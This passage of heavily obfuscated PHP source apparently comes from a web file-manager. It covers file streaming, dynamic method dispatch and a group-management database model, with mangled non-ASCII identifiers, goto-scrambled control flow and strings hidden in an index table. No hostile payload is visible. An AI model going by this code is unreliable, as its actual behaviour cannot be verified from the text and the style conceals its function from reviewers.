0, $fØ·ãÛ³–Œ[1405] => 0, $fØ·ãÛ³–Œ[78] => $aÕåğ…Ãä’[$fØ·ãÛ³–Œ[78]], $fØ·ãÛ³–Œ[1406] => $aÕåğ…Ãä’[$fØ·ãÛ³–Œ[1276]], $fØ·ãÛ³–Œ[1362] => $aÕåğ…Ãä’[$fØ·ãÛ³–Œ[84]], $fØ·ãÛ³–Œ[1361] => $aÕåğ…Ãä’[$fØ·ãÛ³–Œ[194]], $fØ·ãÛ³–Œ[1407] => 0, $fØ·ãÛ³–Œ[1408] => 0); } static $fileInfo = array(); public function info($C±´é¹Ïõ¥) { $AÕù›ù¦ç = $_SERVER[Ôğ—¤Šµˆ˜ñ£][1409]; if (isset(self::$fileInfo[$C±´é¹Ïõ¥])) { return self::$fileInfo[$C±´é¹Ïõ¥]; } if (substr($C±´é¹Ïõ¥, 0, strlen($AÕù›ù¦ç)) != $AÕù›ù¦ç) { return !1; } self::$fileInfo[$C±´é¹Ïõ¥] = IO::info(substr($C±´é¹Ïõ¥, strlen($AÕù›ù¦ç))); return self::$fileInfo[$C±´é¹Ïõ¥]; } public static function read($BÖİâäØ‹, $fŞ°—õÃ«», $FÇº¡œĞ¹¸) { if (!isset(self::$_fopenCache[$BÖİâäØ‹])) { $bíØ±ôÚë« = new StreamWrapperIO(); $bíØ±ôÚë«->stream_open($BÖİâäØ‹); self::$_fopenCache[$BÖİâäØ‹] = $bíØ±ôÚë«; } $bíØ±ôÚë« = self::$_fopenCache[$BÖİâäØ‹]; return $bíØ±ôÚë«->fileSubstr($fŞ°—õÃ«», $FÇº¡œĞ¹¸); } public static function _read($D Îê˜ö„ñ, $a¤ã¼¾‹ó, $Eøõ¸ªŞÁ) { goto F–ÓÊ¥ÖñÌ; eÜ¼Ó „­‰: return $d‘á—–À²Å; goto cÇ°Ğƒ¶‡ì; F–ÓÊ¥ÖñÌ: $c£Ä¶­• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÊÈ±›ÃÙ‘ = fopen($D Îê˜ö„ñ, $c£Ä¶­•[1280]); if (!$FÊÈ±›ÃÙ‘) { return $c£Ä¶­•[33]; } goto Eù›»›ğóõ; fŒÖ¤äÄ®ç: $Eœ‘ÙÙšï = 0; while ($Eœ‘ÙÙšï < $Eøõ¸ªŞÁ) { $aŒÛ‘ŞĞšŠ = min($e‹…”´¯°À, $Eøõ¸ªŞÁ - $Eœ‘ÙÙšï); $d‘á—–À²Å .= fread($FÊÈ±›ÃÙ‘, $aŒÛ‘ŞĞšŠ); $Eœ‘ÙÙšï += $aŒÛ‘ŞĞšŠ; } fclose($FÊÈ±›ÃÙ‘); goto eÜ¼Ó „­‰; Eù›»›ğóõ: $e‹…”´¯°À = 8192; fseek($FÊÈ±›ÃÙ‘, $a¤ã¼¾‹ó, SEEK_SET); $d‘á—–À²Å = $c£Ä¶­•[33]; goto fŒÖ¤äÄ®ç; cÇ°Ğƒ¶‡ì: } public function fileSubstr($båÎ¢Îõ°, $D¤¬çÍˆ‡Ê) { goto Dß—©Ñ”İ; FÅÓš¹’‡°: if ($båÎ¢Îõ° + $D¤¬çÍˆ‡Ê > $böÂßëíæ) { $D¤¬çÍˆ‡Ê = $böÂßëíæ - $båÎ¢Îõ°; } if ($D¤¬çÍˆ‡Ê <= 0) { return $Bˆá¢¢µ™[33]; } if ($båÎ¢Îõ° < 0 || $båÎ¢Îõ° >= $böÂßëíæ || $D¤¬çÍˆ‡Ê <= 0 || $D¤¬çÍˆ‡Ê > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\154\x65\122\x65\141\144\40\x65\x72\162\157\162\41\x20\163\164\x61\x72\x74\x3d{$båÎ¢Îõ°}\73\154\145\156\x67\x74\x68\x3d{$D¤¬çÍˆ‡Ê}\x3b\x20\x73\151\x7a\145\x3d{$böÂßëíæ}\x3b"); } goto eáÙ—‘¨„; C¾Õ»¦Û½: $C÷ËÖ¥Àó = $D¤¬çÍˆ‡Ê; if ($båÎ¢Îõ° < 0) { $båÎ¢Îõ° = $böÂßëíæ + $båÎ¢Îõ°; } if ($D¤¬çÍˆ‡Ê === !1) { $D¤¬çÍˆ‡Ê = $böÂßëíæ - $båÎ¢Îõ°; } goto FÅÓš¹’‡°; Dß—©Ñ”İ: $Bˆá¢¢µ™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $böÂßëíæ = $this->info[$Bˆá¢¢µ™[78]]; $fßØãåòŒ• = $båÎ¢Îõ°; goto C¾Õ»¦Û½; eáÙ—‘¨„: $bˆÛÛ®œïñ = 64 * 1024; $e­ªŠŒƒ©ã =& self::$_chunkBuffer[$this->path]; if (!$e­ªŠŒƒ©ã) { $e­ªŠŒƒ©ã = array(); } goto DÇÔ¹Û¤; aî²Ÿ†Á‰Ä: ksort($e­ªŠŒƒ©ã); $câ˜òÜ‰ = substr($eõ¨¬“Ïá, $båÎ¢Îõ° - $d¦­ˆ™…ÓÅ, $D¤¬çÍˆ‡Ê); return $câ˜òÜ‰; goto FèŞÒËö½; DÇÔ¹Û¤: $eá«•˜õØ¾ = 0; $Cí‚¢¡³çç = 0; $b†ê‡ä®Ú = $Bˆá¢¢µ™[33]; goto eŠƒÏéêØò; A°íéõòÛ: $d«œšå¶ƒ = ceil(($båÎ¢Îõ° + $D¤¬çÍˆ‡Ê) / $bˆÛÛ®œïñ) * $bˆÛÛ®œïñ - $d¦­ˆ™…ÓÅ; $eõ¨¬“Ïá = IO::fileSubstr($this->path, $d¦­ˆ™…ÓÅ, $d«œšå¶ƒ); $e­ªŠŒƒ©ã[$d¦­ˆ™…ÓÅ . $Bˆá¢¢µ™[33]] = $eõ¨¬“Ïá; goto aî²Ÿ†Á‰Ä; eŠƒÏéêØò: foreach ($e­ªŠŒƒ©ã as $eá«•˜õØ¾ => $b†ê‡ä®Ú) { $eá«•˜õØ¾ = intval($eá«•˜õØ¾); $Cí‚¢¡³çç = $eá«•˜õØ¾ + strlen($b†ê‡ä®Ú); if ($båÎ¢Îõ° >= $Cí‚¢¡³çç) { continue; } if ($båÎ¢Îõ° >= $eá«•˜õØ¾ && $båÎ¢Îõ° + $D¤¬çÍˆ‡Ê <= $Cí‚¢¡³çç) { return substr($b†ê‡ä®Ú, $båÎ¢Îõ° - $eá«•˜õØ¾, $D¤¬çÍˆ‡Ê); } break; } if (count($e­ªŠŒƒ©ã) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Bˆá¢¢µ™[1410], $Bˆá¢¢µ™[1411] . count($e­ªŠŒƒ©ã) . "\x3b\163\x74\141\162\x74\x3d{$båÎ¢Îõ°}\x2c\x6c\x65\156\x67\164\150\75{$D¤¬çÍˆ‡Ê}\73\x70\157\x73\x65\72{$eá«•˜õØ¾}\x7e{$Cí‚¢¡³çç}"); throw new Exception($Bˆá¢¢µ™[1412]); } $d¦­ˆ™…ÓÅ = intval($båÎ¢Îõ° / $bˆÛÛ®œïñ) * $bˆÛÛ®œïñ; goto A°íéõòÛ; FèŞÒËö½: } private function log($f™¤äªÓë, $aó¬ÇÃ”¢î) { $C¼…‹¤•– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fğ¡ÈÃÁ = timeFloat() - $this->timeStart; write_log(sprintf($C¼…‹¤•–[1413], $f™¤äªÓë, $this->info[$C¼…‹¤•–[28]], $fğ¡ÈÃÁ, $aó¬ÇÃ”¢î), $C¼…‹¤•–[1099]); } } goto aùÁ•»Ñƒš; BĞ‹ÌŞ¬Ã: function binCheckBigger($BÜšØ•ŒŠÄ, $F–†²•æªª) { return $BÜšØ•ŒŠÄ > $F–†²•æªª; } $_SERVER[$_SERVER[‡ÃŞ­‘Ï][3]] = ("\x39\x33\x31\x30"."\x34\x33")+0;$_avbr="6Bn7rJ49XmrZmwMe4JAc62uquF8EKSgEjfXhnktaMPpmspCXu4qyTr9xHbSgAfKMmBV5JqR73P3T";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Aİ¦¡²Š¸Ñ, $dôãõ¥†¶Ö) { $B×¸ÖÂ·× =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset(self::$_methodList[$Aİ¦¡²Š¸Ñ])) { return @call_user_func_array(self::$_methodList[$Aİ¦¡²Š¸Ñ], $dôãõ¥†¶Ö); } else { if (method_exists($this, $Aİ¦¡²Š¸Ñ)) { return call_user_func_array(array($this, $Aİ¦¡²Š¸Ñ), $dôãõ¥†¶Ö); } else { think_exception(__CLASS__ . $B×¸ÖÂ·×[4] . $Aİ¦¡²Š¸Ñ . $B×¸ÖÂ·×[5]); } } } public static function __callStatic($BİêÔÄ’Ÿ‘, $F¤Ú‘½¦ßİ) { if (isset(self::$_methodListStatic[$BİêÔÄ’Ÿ‘])) { return call_user_func_array(self::$_methodListStatic[$BİêÔÄ’Ÿ‘], $F¤Ú‘½¦ßİ); } else { if (method_exists(self, $BİêÔÄ’Ÿ‘)) { return call_user_func_array(array(self, $BİêÔÄ’Ÿ‘), $F¤Ú‘½¦ßİ); } else { show_json("{$BİêÔÄ’Ÿ‘}\x28\x29\40\156\x6f\x74\x20\145\x78\x69\163\x74\x3b", !1); } } } public static function addMethod($e¹Œ±¸¬•, $AÉà¡Ë¶ì) { self::$_methodList[$e¹Œ±¸¬•] = $AÉà¡Ë¶ì; } public static function addMethodStatic($d÷²”‹ÁÈ‹, $dÂùÉŒ¸±‡) { self::$_methodListStatic[$d÷²”‹ÁÈ‹] = $dÂùÉŒ¸±‡; } } goto a¯ó±ŒÃ½; B‰ïƒÑ¦é: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\x6d\145" => "\147\x72\x6f\165\160\137\155\x65\x74\141", "\x6d\145\x74\141\x46\151\x65\x6c\x64" => "\147\162\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($CÄã¬§½¦¹) { $EÃ À£¾§˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($EÃ À£¾§˜[1793] => array($CÄã¬§½¦¹[0], $EÃ À£¾§˜[1794]), $EÃ À£¾§˜[1795] => array($CÄã¬§½¦¹[0], $EÃ À£¾§˜[1796])); } protected function getInfo($Eøã ‹·‡, $FŒ¦´‰ ğ = false) { $eˆ“äÄƒ = $this->getInfoSimple($Eøã ‹·‡); if (!$eˆ“äÄƒ) { return !1; } if ($FŒ¦´‰ ğ) { return $this->_listDataApplyItem($eˆ“äÄƒ); } return $this->cacheFunctionGet($_SERVER[Ôğ—¤Šµˆ˜ñ£][1797], $Eøã ‹·‡); } protected function getInfoSimple($eÃ¤¯¡Ãì, $B†ìÆâ• = false) { $e·–Ñ†ğšš =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($B†ìÆâ•) { $aê£¾²“ = array($e·–Ñ†ğšš[1719] => intval($eÃ¤¯¡Ãì)); $fÚ·Ú¢Ğ¡ = $this->where($aê£¾²“)->find(); return is_array($fÚ·Ú¢Ğ¡) ? $fÚ·Ú¢Ğ¡ : array(); } return $this->cacheFunctionGet($e·–Ñ†ğšš[1798], $eÃ¤¯¡Ãì); } protected function groupAdd($fİˆÎéÛ†Ã) { goto cäñÙøÖÄ; C¨â‘ß©»: if (isset($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1801]])) { $this->metaSet($F„æßç¬Åˆ, array($Aßœ…’Ò¢ä[1801] => $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1801]], $Aßœ…’Ò¢ä[1802] => $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1802]])); unset($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1801]]); unset($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1802]]); } Model($Aßœ…’Ò¢ä[1227])->groupRootAdd($F„æßç¬Åˆ); return $F„æßç¬Åˆ; goto C•—ÄÀŒ; Eõğ§õâ¦³: if (!empty($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1719]])) { $aÕÙ°È ©[$Aßœ…’Ò¢ä[1719]] = $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1719]]; } $F„æßç¬Åˆ = $this->add($aÕÙ°È ©); $this->setNamePinyin($F„æßç¬Åˆ, $aÕÙ°È ©[$Aßœ…’Ò¢ä[28]]); goto C¨â‘ß©»; dêˆÀ¯¹„Á: if ($dïáš°Ø‘Æ[$Aßœ…’Ò¢ä[515]]) { $FĞ‹âÚ«®œ = $dïáš°Ø‘Æ[$Aßœ…’Ò¢ä[515]] . $dïáš°Ø‘Æ[$Aßœ…’Ò¢ä[1719]] . $Aßœ…’Ò¢ä[47]; } $aÕÙ°È © = array($Aßœ…’Ò¢ä[415] => $this->groupNameAuto($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[492]], $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[28]]), $Aßœ…’Ò¢ä[396] => $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[492]], $Aßœ…’Ò¢ä[578] => $FĞ‹âÚ«®œ, $Aßœ…’Ò¢ä[1799] => $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1703]], $Aßœ…’Ò¢ä[1800] => 0, $Aßœ…’Ò¢ä[1723] => 0); if (isset($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1742]])) { $aÕÙ°È ©[$Aßœ…’Ò¢ä[1742]] = $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1742]]; } else { $aÄ±’çêÆ = $this->max($Aßœ…’Ò¢ä[1742]); if (!$aÄ±’çêÆ) { $aÄ±’çêÆ = 0; } $aÕÙ°È ©[$Aßœ…’Ò¢ä[1742]] = $aÄ±’çêÆ + 1; } goto Eõğ§õâ¦³; cäñÙøÖÄ: $Aßœ…’Ò¢ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[492]] && isset($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1719]]) && $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1719]] == 1) { if ($dïáš°Ø‘Æ = $this->getInfoSimple($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1719]], !0)) { return $fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[1719]]; } } else { $dïáš°Ø‘Æ = $this->getInfoSimple($fİˆÎéÛ†Ã[$Aßœ…’Ò¢ä[492]]); if (!$dïáš°Ø‘Æ) { return !1; } } $FĞ‹âÚ«®œ = $Aßœ…’Ò¢ä[525]; goto dêˆÀ¯¹„Á; C•—ÄÀŒ: } protected function groupEdit($càÄ–—•ÏÆ, $f÷ğÅÓ©ù) { goto EÇœÌ¼ïÃ; EÇœÌ¼ïÃ: $DçŠÏøÂëÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c°Š±éËŸö = $this->getInfoSimple($càÄ–—•ÏÆ); if (!$c°Š±éËŸö) { return !1; } goto BğÎ–±©—‰; Fƒëå¦ ±ø: $this->_clearChildrenCache($c°Š±éËŸö); return $this->where(array($DçŠÏøÂëÔ[1803] => $càÄ–—•ÏÆ))->save($f÷ğÅÓ©ù); goto a†©™âÛ›Š; BğÎ–±©—‰: if (!empty($f÷ğÅÓ©ù[$DçŠÏøÂëÔ[492]])) { $Bäå•ÕœŒ = $this->getInfoSimple($f÷ğÅÓ©ù[$DçŠÏøÂëÔ[492]]); if (!$Bäå•ÕœŒ) { return !1; } if ($c°Š±éËŸö[$DçŠÏøÂëÔ[1719]] == $Bäå•ÕœŒ[$DçŠÏøÂëÔ[1719]]) { return !1; } if ($f÷ğÅÓ©ù[$DçŠÏøÂëÔ[492]] != $c°Š±éËŸö[$DçŠÏøÂëÔ[492]]) { if ($Bäå•ÕœŒ[$DçŠÏøÂëÔ[515]] !== $c°Š±éËŸö[$DçŠÏøÂëÔ[515]] && strpos($Bäå•ÕœŒ[$DçŠÏøÂëÔ[515]], $c°Š±éËŸö[$DçŠÏøÂëÔ[515]] . $c°Š±éËŸö[$DçŠÏøÂëÔ[1719]] . $DçŠÏøÂëÔ[47]) === 0) { return !1; } $f÷ğÅÓ©ù[$DçŠÏøÂëÔ[578]] = $Bäå•ÕœŒ[$DçŠÏøÂëÔ[515]] . $f÷ğÅÓ©ù[$DçŠÏøÂëÔ[492]] . $DçŠÏøÂëÔ[47]; $this->_changeChildLevel($c°Š±éËŸö, $Bäå•ÕœŒ); } } if (isset($f÷ğÅÓ©ù[$DçŠÏøÂëÔ[28]])) { $this->setNamePinyin($càÄ–—•ÏÆ, $f÷ğÅÓ©ù[$DçŠÏøÂëÔ[28]]); } if (isset($f÷ğÅÓ©ù[$DçŠÏøÂëÔ[1801]])) { $this->metaSet($càÄ–—•ÏÆ, array($DçŠÏøÂëÔ[1801] => $f÷ğÅÓ©ù[$DçŠÏøÂëÔ[1801]], $DçŠÏøÂëÔ[1802] => $f÷ğÅÓ©ù[$DçŠÏøÂëÔ[1802]])); unset($f÷ğÅÓ©ù[$DçŠÏøÂëÔ[1801]]); unset($f÷ğÅÓ©ù[$DçŠÏøÂëÔ[1802]]); } goto Fƒëå¦ ±ø; a†©™âÛ›Š: } private function _clearChildrenCache($f÷²¦¤Šœ¨) { $b®Ÿ—£›‚ã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c©¬Ø¢ğœ = array($b®Ÿ—£›‚ã[578] => array($b®Ÿ—£›‚ã[538], $f÷²¦¤Šœ¨[$b®Ÿ—£›‚ã[515]] . $f÷²¦¤Šœ¨[$b®Ÿ—£›‚ã[1719]] . $b®Ÿ—£›‚ã[539])); $bÕª• ß¤– = $this->field($b®Ÿ—£›‚ã[1719])->where($c©¬Ø¢ğœ)->select(); foreach ($bÕª• ß¤– as $b…Äâ´ˆğ) { $this->_clearCache($b…Äâ´ˆğ[$b®Ÿ—£›‚ã[1719]]); } } private function _clearCache($aé‘Ø†äÜ) { $e–çš§´ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->cacheFunctionClear($e–çš§´[1797], $aé‘Ø†äÜ); $this->cacheFunctionClear($e–çš§´[1798], $aé‘Ø†äÜ); } private function _changeChildLevel($EæÈ§‹ê, $bª–ºØº­, $fºŒˆ½†İŒ = false) { goto a¶¢ó„ŸÃì; a¶¢ó„ŸÃì: $eºÌ¼ÜñÉ¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a©ÀÔ™‰ï = $EæÈ§‹ê[$eºÌ¼ÜñÉ¨[515]] . $EæÈ§‹ê[$eºÌ¼ÜñÉ¨[1719]] . $eºÌ¼ÜñÉ¨[47]; $Féºô¶ğ—´ = $bª–ºØº­[$eºÌ¼ÜñÉ¨[515]] . $bª–ºØº­[$eºÌ¼ÜñÉ¨[1719]] . $eºÌ¼ÜñÉ¨[47] . $EæÈ§‹ê[$eºÌ¼ÜñÉ¨[1719]] . $eºÌ¼ÜñÉ¨[47]; goto D‚¼¢Šë´Â; D‚¼¢Šë´Â: if ($fºŒˆ½†İŒ) { $Féºô¶ğ—´ = $bª–ºØº­[$eºÌ¼ÜñÉ¨[515]] . $bª–ºØº­[$eºÌ¼ÜñÉ¨[1719]] . $eºÌ¼ÜñÉ¨[47]; } $aËƒí×ø˜È = array($eºÌ¼ÜñÉ¨[578] => array($eºÌ¼ÜñÉ¨[538], $EæÈ§‹ê[$eºÌ¼ÜñÉ¨[515]] . $EæÈ§‹ê[$eºÌ¼ÜñÉ¨[1719]] . $eºÌ¼ÜñÉ¨[539])); $aîå‰Éêà = array($eºÌ¼ÜñÉ¨[578] => array($eºÌ¼ÜñÉ¨[587], "\162\x65\160\x6c\141\143\x65\x28\x70\141\162\x65\156\164\x4c\145\166\145\x6c\x2c\47{$a©ÀÔ™‰ï}\x27\x2c\47{$Féºô¶ğ—´}\47\x29")); goto Bğ×¡òòâ®; Bğ×¡òòâ®: $this->_clearChildrenCache($EæÈ§‹ê); $this->where($aËƒí×ø˜È)->data($aîå‰Éêà)->save(); goto A¿¨Ç÷ÁÈ; A¿¨Ç÷ÁÈ: } public function setNamePinyin($AƒÉïí„˜ , $Bæö¦´ô’ = false) { $f²¨Ô“Ï¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Bæö¦´ô’) { $aÇÖÜ¥ÙŠ = $this->getInfoSimple($AƒÉïí„˜ ); $Bæö¦´ô’ = $aÇÖÜ¥ÙŠ[$f²¨Ô“Ï¹[28]]; } if (!Input::check($Bæö¦´ô’, $f²¨Ô“Ï¹[581])) { $this->metaSet($AƒÉïí„˜ , $f²¨Ô“Ï¹[458], null); $this->metaSet($AƒÉïí„˜ , $f²¨Ô“Ï¹[457], null); return; } $d££–ù¶’Ş = array($f²¨Ô“Ï¹[458] => str_replace($f²¨Ô“Ï¹[50], $f²¨Ô“Ï¹[33], Pinyin::get($Bæö¦´ô’)), $f²¨Ô“Ï¹[457] => Pinyin::get($Bæö¦´ô’, $f²¨Ô“Ï¹[582])); $this->metaSet($AƒÉïí„˜ , $d££–ù¶’Ş); } protected function groupStatus($F¼½»“‘Šˆ, $Cˆ»œ”ÒÚš) { goto E¾Õ×¬ÒÄ»; C„ï©†Ù‰å: foreach ($B¢»Æ•ã‡‡ as $F¼½»“‘Šˆ) { $DÓ„»‡†¶æ[] = array($DŠËÉ’Ï•‡[1719] => $F¼½»“‘Šˆ, $DŠËÉ’Ï•‡[93] => $DŠËÉ’Ï•‡[731], $DŠËÉ’Ï•‡[372] => $Cˆ»œ”ÒÚš); $this->_clearCache($F¼½»“‘Šˆ); } return Model($DŠËÉ’Ï•‡[1804])->addAll($DÓ„»‡†¶æ, array(), !0); goto bË¼ïË‚ÑÜ; EÍ»¡‡Ñ–‹: if ($Cˆ»œ”ÒÚš == $DŠËÉ’Ï•‡[87]) { $B¢»Æ•ã‡‡ = $this->parentLevelArray($Bµ—·ÂŞÁ[$DŠËÉ’Ï•‡[515]]); } else { $Aî¾¡øœªŞ = array($DŠËÉ’Ï•‡[578] => array($DŠËÉ’Ï•‡[538], $Bµ—·ÂŞÁ[$DŠËÉ’Ï•‡[515]] . $Bµ—·ÂŞÁ[$DŠËÉ’Ï•‡[1719]] . $DŠËÉ’Ï•‡[539])); $B¢»Æ•ã‡‡ = $this->where($Aî¾¡øœªŞ)->field($DŠËÉ’Ï•‡[1719])->select(); $B¢»Æ•ã‡‡ = array_to_keyvalue($B¢»Æ•ã‡‡, $DŠËÉ’Ï•‡[33], $DŠËÉ’Ï•‡[1719]); } $B¢»Æ•ã‡‡[] = $Bµ—·ÂŞÁ[$DŠËÉ’Ï•‡[1719]]; $DÓ„»‡†¶æ = array(); goto C„ï©†Ù‰å; E¾Õ×¬ÒÄ»: $DŠËÉ’Ï•‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Bµ—·ÂŞÁ = $this->getInfoSimple($F¼½»“‘Šˆ); if (!$Bµ—·ÂŞÁ) { return !1; } goto EÍ»¡‡Ñ–‹; bË¼ïË‚ÑÜ: } protected function groupRemove($C®Ö÷‹íÂÁ) { goto F÷—˜ô›³£; EùÒŠó½–ö: if (!$BùŞªËËÃÉ || $BùŞªËËÃÉ[$aØ‚ì‰àŠ[492]] == 0) { return !1; } $AèŒé£ùºö = $this->getInfoSimple($BùŞªËËÃÉ[$aØ‚ì‰àŠ[492]]); $this->_changeChildLevel($BùŞªËËÃÉ, $AèŒé£ùºö, !0); goto eõîšŠ¦»; F÷—˜ô›³£: $aØ‚ì‰àŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Bäë‹ÑŸĞ = array($aØ‚ì‰àŠ[1719] => $C®Ö÷‹íÂÁ); $BùŞªËËÃÉ = $this->where($Bäë‹ÑŸĞ)->find(); goto EùÒŠó½–ö; eõîšŠ¦»: $this->where(array($aØ‚ì‰àŠ[492] => $C®Ö÷‹íÂÁ))->save(array($aØ‚ì‰àŠ[492] => $BùŞªËËÃÉ[$aØ‚ì‰àŠ[492]])); Model($aØ‚ì‰àŠ[1804])->where($Bäë‹ÑŸĞ)->delete(); Model($aØ‚ì‰àŠ[1805])->where($Bäë‹ÑŸĞ)->delete(); goto Bë—ÉÄ„®; Bë—ÉÄ„®: Model($aØ‚ì‰àŠ[813])->groupRootRemove($C®Ö÷‹íÂÁ); return $this->where($Bäë‹ÑŸĞ)->delete(); goto BäŒ¡œ•á; BäŒ¡œ•á: } protected function groupSort($dÀéÇí²»¨) { $BÊ¿Óê ã© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d¼Ò‹ÈñŠŠ = array(); foreach ($dÀéÇí²»¨ as $eùŒôôÎäÎ => $Fé¼ªØ‰„…) { $d¼Ò‹ÈñŠŠ[] = array($BÊ¿Óê ã©[1719], $Fé¼ªØ‰„…, $BÊ¿Óê ã©[1742], $eùŒôôÎäÎ + 1); } $this->saveAll($d¼Ò‹ÈñŠŠ); } public function listData() { $AôÀŒ§¦Ê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($AôÀŒ§¦Ê[$_SERVER[Ôğ—¤Šµˆ˜ñ£][367]]); return $AôÀŒ§¦Ê; } private function _makeOrder($bšâ­Àä÷¨ = '') { goto c•‚ÁÑäï×; c•‚ÁÑäï×: $D–â„ã¯ß =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e§İğÏ¿¨ = array($D–â„ã¯ß[1719], $D–â„ã¯ß[28], $D–â„ã¯ß[1705], $D–â„ã¯ß[194]); $A‹«İÏ = array($D–â„ã¯ß[442] => $D–â„ã¯ß[443], $D–â„ã¯ß[444] => $D–â„ã¯ß[445]); goto cœ’¡å›Î; cœ’¡å›Î: $A¾ñƒ©èí± = Input::get($D–â„ã¯ß[449], $D–â„ã¯ß[7], $D–â„ã¯ß[1723], $e§İğÏ¿¨); $cÆ£ÍÖİ›‡ = Input::get($D–â„ã¯ß[450], $D–â„ã¯ß[7], $D–â„ã¯ß[1806], array($D–â„ã¯ß[1806], $D–â„ã¯ß[444])); $cÆ£ÍÖİ›‡ = $A‹«İÏ[$cÆ£ÍÖİ›‡]; goto D«³Éªğ§; D«³Éªğ§: $bšâ­Àä÷¨ = $bšâ­Àä÷¨ . "{$A¾ñƒ©èí±}\x20{$cÆ£ÍÖİ›‡}\x2c\40\x67\x72\157\x75\160\111\x44\x20\141\163\143"; return $this->order($bšâ­Àä÷¨); goto D›¯’ƒÈñ; D›¯’ƒÈñ: } public function listChild($e•âæ…Ìæ’) { $a Û™õœ· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Fè…Œ¬–‰¹ = $this->where(array($a Û™õœ·[492] => $e•âæ…Ìæ’))->_makeOrder()->selectPage(200); $this->_listDataApply($Fè…Œ¬–‰¹[$a Û™õœ·[367]]); return $Fè…Œ¬–‰¹; } public function listByID($bğåÌ ½) { goto A ª÷ÃŠèƒ; E´Åò…©îÉ: return $C¢¨Ğ™÷Î­; goto CÁ» ˜‹ù; D„‡†×À¹ñ: $C¢¨Ğ™÷Î­ = $this->where($a÷•Û÷È®Ò)->select(); $C¢¨Ğ™÷Î­ = array_sort_keep($C¢¨Ğ™÷Î­, $D´Ëí‰­ïÔ[1719], $bğåÌ ½); $this->_listDataApply($C¢¨Ğ™÷Î­); goto E´Åò…©îÉ; A ª÷ÃŠèƒ: $D´Ëí‰­ïÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$bğåÌ ½) { return array(); } $a÷•Û÷È®Ò = array($D´Ëí‰­ïÔ[1719] => array($D´Ëí‰­ïÔ[7], $bğåÌ ½)); goto D„‡†×À¹ñ; CÁ» ˜‹ù: } public function listSearch($dãÎ×³ŠíÏ) { goto c™‘İ—«ä“; A‰¬£ŠÆÚº: if (!trim($f• –ßº½)) { return !1; } $f• –ßº½ = str_replace($fñ°ñ‚ÂİÌ[1809], $fñ°ñ‚ÂİÌ[1810], $f• –ßº½); $BÉî•Ã¿ = array($fñ°ñ‚ÂİÌ[1719] => array($fñ°ñ‚ÂİÌ[381], "{$f• –ßº½}\x25"), $fñ°ñ‚ÂİÌ[28] => array($fñ°ñ‚ÂİÌ[381], "\x25{$f• –ßº½}\45"), $fñ°ñ‚ÂİÌ[980] => $fñ°ñ‚ÂİÌ[1811]); goto BóÒ†Ûˆ; CéëÌá: return $c“õ•šÍîÊ; goto aÜÍ²îâÎ–; b¯“ò›å¹‘: $c“õ•šÍîÊ = $c“õ•šÍîÊ ? $c“õ•šÍîÊ : array($fñ°ñ‚ÂİÌ[367] => array(), $fñ°ñ‚ÂİÌ[364] => array()); if (!$c“õ•šÍîÊ || count($c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[367]]) < 5 && Input::check($f• –ßº½, $fñ°ñ‚ÂİÌ[316])) { goto c’¸±ÂÀ­ˆ; c’¸±ÂÀ­ˆ: $eÆ†óÙÖ = $this->groupChildrenAll($d’±ê‡Ú©ç); $F­Ç˜ö¤¬‚ = $this->_searchFromMeta($fñ°ñ‚ÂİÌ[457], $f• –ßº½, 10, $eÆ†óÙÖ); $DÅŒğ™†ˆî = $this->_searchFromMeta($fñ°ñ‚ÂİÌ[458], $f• –ßº½, 10, $eÆ†óÙÖ); goto fÙ•¨Ş“; fÙ•¨Ş“: $D¹–“ÑÖª = array_merge($F­Ç˜ö¤¬‚, $DÅŒğ™†ˆî, $c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[367]]); $c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[367]] = array_unique_by_key($D¹–“ÑÖª, $fñ°ñ‚ÂİÌ[1719]); $c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[364]][$fñ°ñ‚ÂİÌ[365]] = count($c“õ•šÍîÊ[$fñ°ñ‚ÂİÌ[367]]); goto 